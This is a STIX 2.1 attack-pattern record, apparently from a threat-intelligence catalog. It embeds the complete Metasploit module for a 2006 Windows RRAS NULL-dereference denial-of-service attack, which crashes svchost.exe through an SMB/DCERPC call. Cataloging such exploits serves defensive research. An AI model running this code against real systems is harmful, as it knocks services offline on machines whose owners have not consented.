{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e15dcb7b-4c2a-4f54-a904-0cabcad4b246",
    "created": "2024-08-14T16:25:33.808425Z",
    "modified": "2024-08-14T16:25:33.808429Z",
    "name": "Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference",
    "description": " This module triggers a NULL dereference in svchost.exe on all current versions of Windows that run the RRAS service. This service is only accessible without authentication on Windows XP SP1 (using the SRVSVC pipe).  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/smb/rras_vls_null_deref.rb",
            "external_id": "rras_vls_null_deref.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference',\n      'Description'    => %q{\n        This module triggers a NULL dereference in svchost.exe on\n      all current versions of Windows that run the RRAS service. This\n      service is only accessible without authentication on Windows XP\n      SP1 (using the SRVSVC pipe).\n      },\n\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '64340'],\n\n        ],\n      'Actions'     =>\n        [\n          ['Attack', 'Description' => 'Run Denial of Service'],\n        ],\n      'DefaultAction' => 'Attack',\n      'DisclosureDate' => '2006-06-14'\n    ))\n\n    register_options(\n      [\n        OptString.new('SMBPIPE', [ true,  \"The pipe name to use (ROUTER, SRVSVC)\", 'ROUTER']),\n      ])\n\n  end\n\n  def run\n    connect\n    smb_login\n\n    case action.name\n    when 'Attack'\n\n      handle = dcerpc_handle('8f09f000-b7ed-11ce-bbd2-00001a181cad', '0.0', 'ncacn_np', [\"\\\\#{datastore['SMBPIPE']}\"])\n\n      print_status(\"Binding to #{handle} ...\")\n      dcerpc_bind(handle)\n      print_status(\"Bound to #{handle} ...\")\n      stb = [0, 0, 0, 0].pack('V*')\n\n      print_status(\"Calling the vulnerable function...\")\n      begin\n        dcerpc.call(0x0C, stb)\n      rescue Rex::Proto::DCERPC::Exceptions::NoResponse\n      rescue => e\n        if e.to_s !~ /STATUS_PIPE_DISCONNECTED/\n          raise e\n        end\n      end\n\n    end\n\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-06-14"
}